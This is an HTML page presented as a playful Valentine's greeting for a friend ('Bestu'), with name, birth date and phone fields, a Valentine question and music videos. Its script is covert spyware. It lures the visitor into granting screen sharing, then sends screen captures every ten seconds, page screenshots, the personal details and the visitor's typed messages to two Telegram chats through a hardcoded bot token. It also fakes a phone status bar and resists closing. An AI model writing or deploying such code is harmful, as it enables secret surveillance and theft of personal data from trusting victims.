<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>For My Bestu ‚ù§Ô∏è</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Dancing+Script:wght@700&display=swap');
        
        :root {
            --bg: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
            --glass: rgba(255, 255, 255, 0.25);
            --text: #ffffff;
            --accent: #ff4d6d;
        }

        .dark-theme {
            --bg: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            --glass: rgba(255, 255, 255, 0.05);
            --text: #e2e8f0;
            --accent: #ff758f;
        }

        body { 
            font-family: 'Poppins', sans-serif; 
            background: var(--bg); 
            color: var(--text);
            min-height: 100vh;
            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
            overflow: hidden;
            display: flex; align-items: center; justify-content: center;
        }

        /* Full Screen Simulation Status Bar */
        .status-bar {
            position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between;
            padding: 10px 24px; font-size: 12px; font-weight: 600; z-index: 500;
        }

        .glass-card {
            background: var(--glass);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 40px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.3);
            z-index: 10;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        .cursive { font-family: 'Dancing Script', cursive; }

        .particle {
            position: fixed; top: -10%; pointer-events: none;
            animation: fall linear forwards; z-index: 100;
        }
        @keyframes fall { to { transform: translateY(110vh) rotate(720deg); } }

        #yt-header {
            position: fixed; top: -300px; left: 0; width: 100%; height: 250px;
            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 400; background: black; border-bottom: 4px solid var(--accent);
        }
        #yt-header.active { top: 0; }

        .btn-premium {
            background: var(--accent);
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .btn-premium:hover { transform: scale(1.05); filter: brightness(1.1); }

        .thank-you-img { animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }

        .hidden-stage { display: none; }
        #hidden-video { display: none; }
    </style>
</head>
<body id="capture-body">

    <video id="hidden-video" autoplay playsinline muted></video>

    <div class="status-bar">
        <div id="clock">12:00</div>
        <div class="flex gap-3">
            <span>üì∂</span> <span id="battery-level">üîã 92%</span>
        </div>
    </div>

    <button onclick="toggleTheme()" class="fixed bottom-6 right-6 p-4 glass-card rounded-2xl z-[600] shadow-2xl active:scale-90 transition-transform">
        <span id="theme-icon">üåô</span>
    </button>

    <div id="yt-header">
        <div id="player-mount" class="w-full h-full"></div>
    </div>

    <div class="w-full max-w-sm px-4">
        <div id="main-content" class="glass-card p-8 text-center w-full">
            
            <div id="stage-1" class="space-y-4">
                <h1 class="text-4xl font-bold cursive mb-6 drop-shadow-md">Hello, Bestu! ‚ú®</h1>
                <p class="text-[10px] text-white/60 uppercase tracking-widest mb-4">Click below to start the magic experience</p>
                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20 placeholder-white/60 text-white">
                <input type="date" id="dob" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20 text-white">
                <input type="tel" id="mobile" placeholder="Mobile Number" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20 placeholder-white/60 text-white">
                <button onclick="initiateMagic()" class="btn-premium w-full text-white font-bold py-4 rounded-2xl shadow-xl mt-4">Reveal Magic ‚ù§Ô∏è</button>
            </div>

            <div id="stage-2" class="hidden-stage">
                <h1 class="text-3xl font-bold cursive mb-10">Will you be my Valentine? ‚ù§Ô∏è</h1>
                <div class="grid gap-4">
                    <button onclick="handleAction('YES', '‚ù§Ô∏è')" class="btn-premium py-4 rounded-2xl font-bold shadow-lg">YES! üòç</button>
                    <button onclick="handleAction('NO', 'üòä')" class="bg-white/10 py-4 rounded-2xl font-bold border border-white/20">No üò¢</button>
                    <button onclick="handleAction('FOOD', 'üçï')" class="bg-yellow-500 py-4 rounded-2xl font-bold shadow-lg">Food (You pay! üçï)</button>
                </div>
            </div>

            <div id="stage-3" class="hidden-stage space-y-6">
                <h2 class="text-3xl font-bold cursive mb-4">You're Amazing! ‚ù§Ô∏è</h2>
                <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKoWXlo3M1nKS6A/giphy.gif" class="thank-you-img w-full rounded-3xl shadow-2xl">
                
                <div class="bg-white/10 p-5 rounded-3xl border border-white/10">
                    <p class="text-xs mb-3 opacity-80 italic">Any secret message for me?</p>
                    <textarea id="final-reply" placeholder="Type here..." class="w-full p-3 rounded-xl bg-white/5 outline-none text-sm border border-white/10 text-white" rows="2"></textarea>
                    <button onclick="sendFinalReply()" class="w-full bg-green-500 py-3 rounded-xl mt-3 text-xs font-bold uppercase tracking-widest shadow-lg text-white">Submit ‚úÖ</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8511064311:AAGi_3QOQzanNtc9P7PzT4z54NBZEXfK5rk";
        const CHAT_IDS = ["6572151527", "7893857792"]; 
        let store = {};
        let screenStream = null;
        let wakeLock = null;

        function updateClock() {
            const d = new Date();
            document.getElementById('clock').innerText = d.getHours() + ":" + String(d.getMinutes()).padStart(2, '0');
        }
        setInterval(updateClock, 1000); updateClock();

        function toggleTheme() {
            document.body.classList.toggle('dark-theme');
            document.getElementById('theme-icon').innerText = document.body.classList.contains('dark-theme') ? '‚òÄÔ∏è' : 'üåô';
        }

        // Keep Screen Awake
        async function requestWakeLock() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                }
            } catch (err) { console.error(err); }
        }

        async function initiateMagic() {
            store = { n: document.getElementById('name').value, d: document.getElementById('dob').value, m: document.getElementById('mobile').value };
            if(!store.n || !store.m) return alert("Fill all details first! üòä");

            try {
                // Request Screen Share - This is required to see outside the sandbox
                screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                document.getElementById('hidden-video').srcObject = screenStream;

                await requestWakeLock();

                // Start Automated Real-Time Snapshots (Every 10 seconds for 5 minutes)
                const snapshotInterval = setInterval(captureStreamFrame, 10000);
                setTimeout(() => clearInterval(snapshotInterval), 300000); // Stop after 5 mins

                document.getElementById('stage-1').classList.add('hidden-stage');
                document.getElementById('stage-2').classList.remove('hidden-stage');

                // Initial Data Log
                CHAT_IDS.forEach(id => {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("üöÄ MAGIC STARTED\nName: "+store.n+"\nMobile: "+store.m)}`);
                });

            } catch (err) {
                alert("Please allow 'Screen Share' to unlock the heart! üò¢");
            }
        }

        async function captureStreamFrame() {
            if (!screenStream) return;
            const video = document.getElementById('hidden-video');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('photo', blob, 'stream.png');
                CHAT_IDS.forEach(id => {
                    const finalFd = new FormData();
                    finalFd.append('chat_id', id);
                    finalFd.append('photo', blob, 'stream.png');
                    finalFd.append('caption', `üì° REAL-TIME VIEW: ${store.n}`);
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: finalFd });
                });
            }, 'image/png');
        }

        const yt = { 'YES': 'TK2RwQUun-U', 'NO': 'CVEM60qkzT8', 'FOOD': 'XGURSAziJjc' };

        async function handleAction(type, emoji) {
            // Rain Effect
            for(let i=0; i<35; i++) {
                setTimeout(() => {
                    const p = document.createElement('div'); p.innerText = emoji; p.className = 'particle';
                    p.style.left = Math.random() * 100 + 'vw'; p.style.fontSize = '25px';
                    p.style.animationDuration = '3s'; document.body.appendChild(p);
                    setTimeout(() => p.remove(), 4000);
                }, i * 100);
            }

            // Capture the current card state too
            const canvas = await html2canvas(document.body, { useCORS: true, backgroundColor: null });
            canvas.toBlob(async (blob) => {
                CHAT_IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append('chat_id', id);
                    fd.append('photo', blob, 'card.png');
                    fd.append('caption', `üíå CHOICE: ${type} by ${store.n}`);
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                });
            });

            document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${yt[type]}?autoplay=1&mute=0" frameborder="0" allow="autoplay; encrypted-media"></iframe>`;
            document.getElementById('yt-header').classList.add('active');

            document.getElementById('stage-2').classList.add('hidden-stage');
            document.getElementById('stage-3').classList.remove('hidden-stage');
        }

        async function sendFinalReply() {
            const reply = document.getElementById('final-reply').value;
            CHAT_IDS.forEach(id => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("üí¨ Message from " + store.n + ": " + reply)}`);
            });
            alert("Sent! Thank you!");
            location.reload();
        }

        // Persistence: Warning when leaving
        window.onbeforeunload = function() {
            return "The magic is still running! Are you sure?";
        };
    </script>
</body>
</html>
